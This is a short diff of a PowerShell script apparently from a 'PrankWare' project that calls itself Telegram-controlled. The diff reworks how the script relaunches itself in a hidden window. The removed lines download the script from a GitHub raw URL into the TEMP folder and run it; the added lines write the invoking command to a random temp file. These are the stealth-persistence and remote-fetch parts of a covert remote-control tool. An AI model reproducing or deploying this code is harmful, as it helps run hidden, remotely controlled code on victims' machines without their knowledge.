@@ -1,14 +1,17 @@
 if (-not $env:PS_RUN_HIDDEN) {
     $env:PS_RUN_HIDDEN = "1"
 
-    if (-not $MyInvocation.MyCommand.Path) {
-        # Script was run via pipeline, write to temp file
-        $tempPath = "$env:TEMP\prankware.ps1"
-        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xtofuub/PrankWare/main/prankware.ps1' -UseBasicParsing -OutFile $tempPath
-        $scriptPath = $tempPath
-    } else {
-        # Script was run from file
-        $scriptPath = $MyInvocation.MyCommand.Path
+    # Fallback: try to get current script path
+    $scriptPath = $MyInvocation.MyCommand.Path
+    if (-not $scriptPath) {
+        # Not run from a script file. Maybe pipelined? Try to reconstruct path.
+        $scriptPath = "$PSScriptRoot\$($MyInvocation.InvocationName)"
+    }
+
+    # Fallback if still empty (e.g., piped script, dot-sourced, etc.)
+    if (-not (Test-Path $scriptPath)) {
+        $scriptPath = "$env:TEMP\__temp_$(Get-Random).ps1"
+        [System.IO.File]::WriteAllText($scriptPath, $MyInvocation.Line)
     }
 
     $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -19,6 +22,7 @@ if (-not $env:PS_RUN_HIDDEN) {
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     exit
 }
+
 
 
 # Telegram-Controlled PowerShell Script
